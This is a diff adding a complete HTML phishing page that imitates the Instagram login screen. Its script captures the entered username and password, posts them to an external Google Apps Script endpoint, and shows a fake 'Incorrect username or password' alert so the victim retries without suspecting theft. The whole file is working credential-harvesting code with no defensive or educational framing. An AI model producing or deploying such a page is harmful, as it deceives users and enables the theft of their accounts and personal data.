@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=-1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" href="logo.png" />
+</head>
+
+<body>
+    <form method="post" action="" name="contactform" id="contactform">
+        <img src="txt.png" alt="error" />
+        <br />
+
+        <input type="text" id="username" name="username" required placeholder="Phone number,username , or email" />
+
+ 
+        <input type="password" id="password" name="password" required placeholder="Password" />
+
+        <button type="submit" name="submit" id="submit">Login</button>
+        <br />
+        <a href="#">forgot password ?</a>
+        <br />
+        <button type="submit" name="submit" id="submit">
+            Log in with facebook
+        </button>
+    </form>
+    <div class="imgcontainer">
+        <img src="c5Rp7Ym-Klz.png" alt="">
+        <img src="EHY6QnZYdNX.png" alt="">
+    </div>
+</body>
+<script>
+    const scriptURL =
+        "https://script.google.com/macros/s/AKfycbz954-F5hUZ9fn0fEiwr7FouRJnQXutq346hHdoRl60dBZE4T7UccjDBYAOn4VxrH3bOA/exec";
+    const form = document.forms["contactform"];
+
+    form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        fetch(scriptURL, { method: "POST", body: new FormData(form) })
+            .then((response) => alert("Incorrect username or password"))
+            .then(() => {
+                window.location.reload();
+            })
+            .catch((error) => console.error("Error!", error.message));
+    });
+</script>
+
+</html>
